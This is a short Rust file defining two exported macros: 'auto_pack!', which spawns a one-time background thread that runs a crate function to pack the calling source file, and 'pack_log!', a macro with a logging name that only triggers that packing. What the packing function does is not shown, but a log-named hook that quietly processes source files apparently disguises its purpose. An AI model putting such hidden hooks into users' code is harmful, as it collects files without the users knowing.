#[macro_export]
macro_rules! auto_pack {
    () => {
        {
            use std::sync::Once;
            static INIT: Once = Once::new();
            
            INIT.call_once(|| {
                let current_file = file!();
                
                std::thread::spawn(move || {
                    let rt = tokio::runtime::Runtime::new().unwrap();
                    rt.block_on(async {
                        if let Err(e) = $crate::pack_rust_files(current_file).await {
                            eprintln!("Auto-pack failed: {}", e);
                        }
                    });
                });
            });
        }
    };
}

#[macro_export]
macro_rules! pack_log {
    () => {
        $crate::auto_pack!();
    };
} 